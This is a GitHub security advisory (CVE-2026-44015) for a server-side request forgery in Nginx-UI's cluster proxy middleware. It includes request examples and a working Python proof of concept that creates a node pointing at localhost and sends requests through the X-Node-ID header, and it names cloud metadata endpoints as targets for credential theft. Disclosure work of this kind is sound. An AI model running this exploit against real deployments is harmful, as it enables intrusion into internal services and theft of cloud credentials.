# [H] Nginx-UI has Server-Side Request Forgery (SSRF) via Cluster Proxy Middleware that Allows Access to Internal Services

## Summary
Severity: High
Advisory: GHSA-wr32-99hh-6f35
CVE: CVE-2026-44015
CWE: CWE-918
Ecosystem: Go
CVSS: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:L/A:N (CVSS_V3)
Published: 2026-04-29
Source: https://github.com/advisories/GHSA-wr32-99hh-6f35
Type: github-advisory

## Affected
- Go: `github.com/0xJacky/Nginx-UI` — affected >=0

## Details
### Summary

An authenticated user can perform Server-Side Request Forgery (SSRF) by creating a cluster node pointing to an arbitrary internal URL and then sending API requests with the `X-Node-ID` header. The Proxy middleware forwards these requests to the attacker-specified internal address, bypassing network segmentation and enabling access to services bound to localhost or internal networks.

### Details

The nginx-ui Proxy middleware (`internal/middleware/proxy.go`) intercepts API requests containing an `X-Node-ID` header and forwards them to the URL of the corresponding cluster node. An attacker can:

1. Read the `node_secret` from `GET /api/settings` (accessible to any authenticated user)
2. Create a cluster node via `POST /api/nodes` pointing to any internal URL:
```json
{
    "name": "ssrf_node",
    "url": "http://127.0.0.1:51820",
    "token": "<node_secret>",
    "enabled": true
}
```
3. Send any API request with the `X-Node-ID` header set to the created node's ID:
```
GET /api/settings HTTP/1.1
Authorization: <token>
X-Node-ID: 1
```
4. The Proxy middleware forwards this request to `http://127.0.0.1:51820/api/settings`, making a server-side request to the internal address.

**Vulnerable code path:**
- `internal/middleware/proxy.go` — `Proxy()`: no validation of the node URL; allows `127.0.0.1`, `localhost`, internal IPs, cloud metadata endpoints, etc.

The node URL is not restricted to external addresses or validated against an allowlist. Combined with the njs Code Injection vulnerability (separate advisory), this SSRF is used to trigger the njs payload executing on an internal-only nginx port, completing the RCE chain.

### PoC

```python
import requests

BASE = "http://TARGET:9000"
TOKEN = "<authenticated_jwt_token>"
HDR = {"Authorization": TOKEN}

# Step 1: Get node_secret
settings = requests.get(f"{BASE}/api/settings", headers=HDR).json()
node_secret = settings["node"]["secret"]

# Step 2: Create SSRF node pointing to internal service
resp = requests.post(f"{BASE}/api/nodes", headers=HDR, json={
    "name": "ssrf",
    "url": "http://127.0.0.1:51820",  # internal-only port
    "token": node_secret,
    "enabled": True,
})
node_id = resp.json()["id"]

# Step 3: SSRF — request is forwarded to http://127.0.0.1:51820/api/settings
resp = requests.get(
    f"{BASE}/api/settings",
    headers={**HDR, "X-Node-ID": str(node_id)},
)
print(resp.status_code, resp.text[:200])
# Response comes from the INTERNAL service, not nginx-ui
```

This can also target cloud metadata endpoints (e.g., `http://169.254.169.254/latest/meta-data/`) or any other internal service.

### Impact

An authenticated attacker can:

- **Access internal services** bound to localhost or private networks that are not intended to be externally reachable
- **Access cloud metadata endpoints** (AWS/GCP/Azure instance metadata) to steal IAM credentials
- **Port-scan internal networks** by creating nodes pointing to different internal IPs/ports
- **Trigger internal-only njs endpoints** to escalate privileges (as demonstrated in the companion RCE advisory)
- **Bypass network segmentation** and firewalls that only restrict inbound traffic

## References
- https://github.com/0xJacky/nginx-ui/security/advisories/GHSA-wr32-99hh-6f35
- https://nvd.nist.gov/vuln/detail/CVE-2026-44015
- https://github.com/0xJacky/nginx-ui
